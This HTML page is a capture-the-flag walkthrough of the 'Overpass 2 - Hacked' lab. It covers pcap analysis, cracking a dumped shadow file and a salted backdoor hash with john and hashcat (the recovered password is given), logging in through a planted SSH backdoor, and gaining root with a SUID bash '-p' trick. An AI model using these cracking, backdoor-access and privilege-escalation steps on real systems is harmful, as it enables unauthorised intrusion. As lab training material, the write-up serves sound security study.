<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>overpass-2 hacked</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>overpass-2 hacked</h1><br/><strong>Overpass 2 - Hacked<br /></strong><br />Open the attached pcap file in wireshark to analyze it.<br /><br />Proceed with follow TCP stream and increament TCP Stream value in bottom right to see different connections and answer the questions.<br /><br />The portion where we need to crack the Linux Passwords, Following is the walkthrough<br /><br />   1) We get dumped shadow file from &quot;TCP Stream-3&quot; and save it to a hash file.<br />   2) <em><strong>john</strong></em><strong> --wordlist=/usr/share/wordlist/fasttrack.txt overpass2-hash   </strong><br /><br />Study the github code for all backdoor questions.<br /><br /><em><strong>https://github.com/NinjaJc01/ssh-backdoor</strong></em><br /><br />Notice we get a hardcoded salt from the code:<br />1c362db832f3f864c8c2fe05f2002a05<br />We also have a hash in the pcap file<br />6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed<br /><br />Seeing the hashcat wiki:<br /><br /><strong>1710 | sha512($pass.$salt)                                 | Raw Hash salted and/or iterated</strong><br /><br />Thus we need to combine the password hash and salt in our <strong>hash file</strong><br /><strong>Note:</strong> Separator is <strong>&#39;:&#39;</strong><br /><br />eg.<br />Password_hash:salt<br /><br />6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05<br /><br />This is kept in a file and fed to hashcat.<br /><br /><em><strong>hashcat -m 1710 overpass2-new-hash /usr/share/wordlists/rockyou.txt</strong></em><br /><br />We cracked the Password as : <em><strong>november16</strong></em><br /><br /><br />Now we will connect back to the machine using the backdoor the hacker created.<br /><br />Note:<br /><em><strong>ssh james@10.10.131.235 -p 2222 </strong></em><br />The above should work. But it fails in Kali Linux<br /><br /><br />The following command works. Here we are explicitly mentioning <strong>ssh-rsa</strong> as one of the supported <strong>HostKeyAlgorithms</strong><br /><em><strong>ssh  -o HostKeyAlgorithms\ ssh-rsa james@10.10.131.235 -p 2222</strong></em><br /><br />From here we get the user flag.<br /><br /><strong>Root Flag</strong><br /><br />For root flag we find a suid bit set file named <strong>“.suid_bash”</strong><br /><br />If we run it <br /><strong>./.suid_bash</strong><br />ID<br /><em><strong>uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)</strong></em><br /><br />We wont get root access as it takes an argument.<br /><br />However if we run as below:<br /><strong>./.suid_bash -p<br /></strong>ID<br /><em><strong>uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)</strong></em><br /><br />The <strong>euid</strong> and <strong>egid</strong> are Effective User ID and Effective Group ID.<br />The <strong>-p</strong> flag will preserve the permissions. Thus we will have a root shell and get the root flag.<br /><br />Thanks!! </div>
</body>
</html>
